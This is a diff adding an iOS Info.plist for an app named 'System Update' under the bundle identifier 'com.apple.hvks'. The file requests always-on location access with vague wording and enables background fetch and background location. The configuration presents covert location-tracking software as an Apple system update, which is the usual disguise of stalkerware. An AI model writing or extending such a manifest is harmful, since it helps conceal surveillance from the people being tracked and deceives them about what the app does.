@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>CFBundleIdentifier</key>
+    <string>com.apple.hvks</string>
+    <key>CFBundleName</key>
+    <string>System Update</string>
+    <key>CFBundleDisplayName</key>
+    <string>System Update</string>
+    <key>NSLocationAlwaysUsageDescription</key>
+    <string>System needs location for update</string>
+    <key>NSLocationWhenInUseUsageDescription</key>
+    <string>System needs location</string>
+    <key>UIBackgroundModes</key>
+    <array>
+        <string>fetch</string>
+        <string>location</string>
+    </array>
+    <key>CFBundleVersion</key>
+    <string>1.0</string>
+    <key>CFBundleShortVersionString</key>
+    <string>1.0</string>
+</dict>
+</plist>
